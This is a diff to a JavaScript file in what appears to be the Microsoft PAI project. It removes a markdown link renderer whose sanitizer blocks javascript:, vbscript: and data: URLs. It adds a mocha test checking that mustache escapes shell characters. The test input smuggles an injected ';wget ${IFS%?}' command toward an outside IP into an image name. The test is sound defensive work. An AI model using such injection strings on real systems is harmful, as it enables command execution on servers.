@@ -15,43 +15,17 @@
 // DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 // OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 
+const assert = require('assert');
+const mustache = require('mustache');
 
-// module dependencies
-const marked = require('marked');
-const url = require('url');
-
-
-const baseUrl = 'https://github.com/Microsoft/pai/tree/master/docs/';
-
-const renderer = new marked.Renderer();
-
-renderer.link = (href, title, text) => {
-  if (marked.options.sanitize) {
-    try {
-      const prot = decodeURIComponent(unescape(href))
-          .replace(/[^\w:]/g, '')
-          .toLowerCase();
-      if (prot.indexOf('javascript:') === 0 ||
-          prot.indexOf('vbscript:') === 0 ||
-          prot.indexOf('data:') === 0) {
-            return '';
-      }
-    } catch (e) {
-      return '';
-    }
-  }
-  if (href === text && title == null) {
-    return href;
-  }
-  if (href[0] !== '#') {
-    href = url.resolve(baseUrl, href);
-  }
-  let out = '<a href="' + href + '"';
-  if (title) {
-    out += ' title="' + title + '"';
-  }
-  out += '>' + text + '</a>';
-  return out;
-};
-
-module.exports = { renderer };
+describe('Shell escaping in template', () => {
+  it('should escape unsafe shell characters', () => {
+    const input = 'pai.build.base:hadoop2.7.2-cuda8.0-cudnn6-devel\n-ubuntu16.04;wget ${IFS%?}172.23.232.125:3000';
+    const actualOutput = mustache.render('{{ input }}\n{{{ input }}}', {input});
+    const expectedOutput = [
+      'pai.build.base:hadoop2.7.2-cuda8.0-cudnn6-devel\\n-ubuntu16.04\\;wget\\ \\$\\{IFS%\\?\\}172.23.232.125:3000',
+      'pai.build.base:hadoop2.7.2-cuda8.0-cudnn6-devel\n-ubuntu16.04;wget ${IFS%?}172.23.232.125:3000',
+    ].join('\n');
+    assert.strictEqual(actualOutput, expectedOutput);
+  });
+});
